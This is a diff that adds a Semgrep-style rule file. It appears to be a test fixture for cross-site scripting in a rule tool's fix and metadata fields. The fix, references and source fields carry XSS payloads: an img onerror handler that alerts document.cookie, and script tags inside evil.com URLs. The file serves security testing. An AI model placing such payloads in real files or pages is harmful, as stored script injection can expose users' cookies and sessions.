@@ -1,0 +1,17 @@
+rules:
+- id: bbp-xss-fix-field
+  pattern: os.system($CMD)
+  message: Test message
+  languages:
+  - python
+  severity: WARNING
+  fix: <img src=x onerror=alert(document.cookie)>
+  metadata:
+    category: security
+    references:
+    - https://evil.com/<img src=x onerror=alert(1)>
+    source: https://evil.com/<script>alert(1)</script>
+    technology:
+    - python
+    owasp:
+    - A01:2021
